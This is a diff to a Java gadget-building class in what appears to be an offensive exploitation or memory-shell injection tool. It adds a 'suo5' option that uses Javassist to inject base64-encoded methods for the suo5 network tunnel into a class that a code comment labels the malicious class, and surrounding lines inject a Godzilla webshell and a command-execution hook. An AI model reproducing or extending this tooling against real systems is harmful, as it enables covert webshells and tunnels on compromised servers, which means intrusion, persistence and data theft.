@@ -467,6 +467,36 @@ public class Gadgets {
 			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
 			insertTomcatNoLog(ctClass);
 			insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL));
+		} else if ("suo5".equals(type)) {
+
+			// 先写入一些需要的基础属性
+			insertField(ctClass, "gInStream", "java.io.InputStream gInStream;");
+			insertField(ctClass, "gOutStream", "java.io.OutputStream gOutStream;");
+
+			// 依次写入方法
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_CREATE), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_DATA), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_DEL), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_SET_STREAM), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_STATUS), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_U32_TO_BYTES), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_BYTES_TO_U32), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_MARSHAL), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_UNMARSHAL), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_READ_SOCKET), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_READ_INPUT_STREAM_WITH_TIMEOUT), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_TRY_FULL_DUPLEX), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_READ_REQ), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_PROCESS_DATA_UNARY), ctClass));
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_PROCESS_DATA_BIO), ctClass));
+
+			// 为恶意类设置 Runnable 接口以及 RUN 方法
+			CtClass runnableClass = ClassPool.getDefault().get("java.lang.Runnable");
+			ctClass.addInterface(runnableClass);
+			ctClass.addMethod(CtMethod.make(base64Decode(SUO5.RUN), ctClass));
+
+			// 插入关键方法
+			insertMethod(ctClass, method, base64Decode(SUO5.SUO5));
 		} else if ("execute".equals(type)) {
 			insertField(ctClass, "TAG", "public static String TAG = \"" + CMD_HEADER_STRING + "\";");
 			insertCMD(ctClass);
